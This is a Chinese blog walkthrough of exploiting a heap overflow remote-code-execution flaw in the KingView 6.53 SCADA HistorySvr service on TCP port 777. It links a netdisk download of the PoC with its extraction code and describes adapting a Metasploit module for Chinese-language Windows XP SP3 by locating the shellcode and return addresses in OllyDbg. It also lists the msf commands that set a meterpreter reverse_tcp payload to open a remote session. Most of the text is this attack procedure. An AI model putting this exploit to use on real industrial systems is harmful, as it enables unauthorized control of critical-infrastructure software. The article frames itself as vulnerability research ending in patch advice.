# ****1、概述****

全球工控信息安全市场规模稳步增长当前全球范围内工业信息安全整体形势不容乐观，全球暴露在互联网上的工业控制系统及设备数量不断增多，工控安全高危漏洞频现，加上对工业控制系统实施网络攻击的门槛进一步降低，重大工业信息安全事件仍处高发态势，甚至波及能源、制造、医疗、通信、交通、市政等重要领域的关键信息基础设施。

#  **2、** ** **第三方工业SCADA软件介绍****

组态王kingview，即组态王开发[监控系统](https://baike.baidu.com/item/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/2354833)软件，是新型的工业[自动控制系统](https://baike.baidu.com/item/%E8%87%AA%E5%8A%A8%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/1801668)，它以标准的[工业计算机](https://baike.baidu.com/item/%E5%B7%A5%E4%B8%9A%E8%AE%A1%E7%AE%97%E6%9C%BA/4751156)软、硬件平台构成的[集成系统](https://baike.baidu.com/item/%E9%9B%86%E6%88%90%E7%B3%BB%E7%BB%9F/19184781)[取代](https://baike.baidu.com/item/%E5%8F%96%E4%BB%A3/6013549)传统的[封闭式](https://baike.baidu.com/item/%E5%B0%81%E9%97%AD%E5%BC%8F/4691784)系统。

组态王kingview是亚控科技根据当前的[自动化技术](https://baike.baidu.com/item/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/2675223)的发展趋势，面向低端自动化市场及应用，以实现企业一体化为目标开发的一套产品。

该产品以搭建战略性工业应用服务平台为目标，集成了对亚控科技自主研发的工业实时数据库（KingHistorian）的支持，可以为企业提供一个对整个生产流程进行数据汇总、分析及管理的有效平台，使企业能够及时有效地获取信息，及时地做出反应，以获得最优化的结果。目前该软件广泛应用于电力、石油石化等多个自动化工业领域。

#  **3、** ** **漏洞poc简析****

该漏洞的poc我已上传到网盘了，参见4.1环境准备。

此漏洞存在于KingView6.53软件的HistorySvr.exe进程中，这个软件服务程序在TCP
777端口监听时收到一个超长请求，导致堆缓冲区溢出从而执行任何代码。

发现该poc主要是针对如下两个系统的，漏洞代码中没有针对Windows XP SP3 中文版系统的。

![](https://image.3001.net/images/20201204/1607060849_5fc9cd71d43bfd42c8df7.png!small)

为了进一步研究该漏洞在不同操作系统中的实现情况，本文基于Windows XP SP3 中文版系统进行进一步研究。

#  ** **4、漏洞研究过程****

##  ** **4.1环境准备****

靶机：winxp sp3（ip：192.168.10.50）

攻击机：kali linux （ip：192.168.10.26）

工业软件及版本：kingview 6.53

漏洞poc：

链接：https://pan.baidu.com/s/1CuC3RJxcZ1mH-ZeIhLHwsA

提取码：8120

##  ** **4.2 服务开启****

在靶机中安装kingview
6.53工业软件，生成快捷方式如下![](https://image.3001.net/images/20201204/1607060916_5fc9cdb41b4630946b80e.png!small)，HistorySvr.exe进程自动运行，同时可以看到TCP
777端口已经开放

![](https://image.3001.net/images/20201204/1607060937_5fc9cdc90210426baf1b0.png!small)

  

##  ** **4.3 测试版poc构造****

1、通过网盘链接获取漏洞poc

在poc代码中增加新的目标，Ret值随便写一个和上面一样就行

![](https://image.3001.net/images/20201204/1607060982_5fc9cdf6b748c6029b06c.png!small)

同时，仿照着增加如下代码，将shellcode的地址用“ABAC”替换，方便快速定位shellcode

![](https://image.3001.net/images/20201204/1607061018_5fc9ce1abd6e4bfba7ae8.png!small)

将修改后的POC保存为kingview6.53overflow_attack.rb

##  ** **4.4 测试版poc导入****

1、在kali攻击中，如下目录放入下载的exp模块

![](https://image.3001.net/images/20201204/1607061049_5fc9ce390f4dbf30ef73f.png!small)

2、进入msf，加载模块

![](https://image.3001.net/images/20201204/1607061200_5fc9ced00029939a86e8e.png!small)![](https://image.3001.net/images/20201204/1607061188_5fc9cec4c763545591b2a.png!small)

##  ** **4.5 测试版poc攻击研究****

1、攻击机运行“search kingview”命令搜索漏洞

![](https://image.3001.net/images/20201204/1607061224_5fc9cee86b5b7cf5f6fee.png!small)

2、攻击机使用kingview6.53overflow_attack：

步骤：

use exploit/windows/scada/kingview6.53overflow_attack

set payload windows/meterpreter/reverse_tcp

set rhost 192.168.10.50

set lhost 192.168.10.26

set target 2

解释：

use
exploit/windows/scada/kingview6.53overflow_attack：使用kingview6.53overflow_attack漏洞

set payload ：设置payload，这里选择windows/meterpreter/reverse_tcp

set lhost ：指定源IP地址（攻击机IP地址）

set rhost ：指定目的IP地址（靶机IP地址）

set target 2：选择靶机操作系统

  

效果：

  
![](https://image.3001.net/images/20201204/1607061248_5fc9cf00b9afa14f9db97.png!small)

3、靶机通过OllyDbg捕获进程异常，在OllyDbg中开启”Just-in-time debugging“

![](https://image.3001.net/images/20201204/1607061363_5fc9cf73c0bf74fc06d48.png!small)

![](https://image.3001.net/images/20201204/1607061416_5fc9cfa871256d77fec94.png!small)

4、攻击机输入“exploit”

![](https://image.3001.net/images/20201204/1607061435_5fc9cfbb3c5f43f4be03a.png!small)

5、回到靶机，OllyDbg捕获到进程异常：

进程中断在0x00384342处

![](https://image.3001.net/images/20201204/1607061455_5fc9cfcf460a2934793eb.png!small)

在内存中查找ASCII字符“ABAC”

![](https://image.3001.net/images/20201204/1607061481_5fc9cfe9ef531fd46c799.png!small)

成功定位到“ABAC”地址为0x013404C0

![](https://image.3001.net/images/20201204/1607061500_5fc9cffc8978a0496dac9.png!small)

所以shellcode地址：![1607064082_5fc9da12e0258c1faf585.png!small?1607064082869](https://image.3001.net/images/20201204/1607064082_5fc9da12e0258c1faf585.png!small?1607064082869)

Ret地址：![1607064096_5fc9da206d9130715652b.png!small?1607064096425](https://image.3001.net/images/20201204/1607064096_5fc9da206d9130715652b.png!small?1607064096425)

##  ** **4.6 正式版poc构造****

将kingview6.53overflow_attack.rb中的相关地址用4.5中测试研究得到的地址进行替换，更新kingview6.53overflow_attack.rb

  

![](https://image.3001.net/images/20201204/1607061548_5fc9d02c2c4d246785fbf.png!small)![](https://image.3001.net/images/20201204/1607061539_5fc9d0232690d5420ea19.png!small)

  

##  ** **4.7 正式版poc攻击****

1、通过手动启动如下进程，恢复靶机环境，开启777端口

![](https://image.3001.net/images/20201204/1607061583_5fc9d04f6c9a0de1ffc91.png!small)

2、参考4.4~4.6在msf中更新模块，配置相应的攻击参数，然后执行漏洞脚本,发现漏洞成功利用，meterpreter会话成功开启

![](https://image.3001.net/images/20201204/1607061603_5fc9d063ccf39106a511a.png!small)

#  ** **5、总结分析****

本文是针对scada软件kingview的RCE漏洞进行进一步研究，通过研究，该漏洞可以成功在winxp sp3
中文版系统执行，漏洞执行成功后可远程执行未经授权的恶意代码。建议使用该软件的自动化企业及时打满补丁以绝后患。

 ** **参考资料****

> 《Metasploit魔鬼训练营》
>
> https://www.sohu.com/a/324816364_99922905

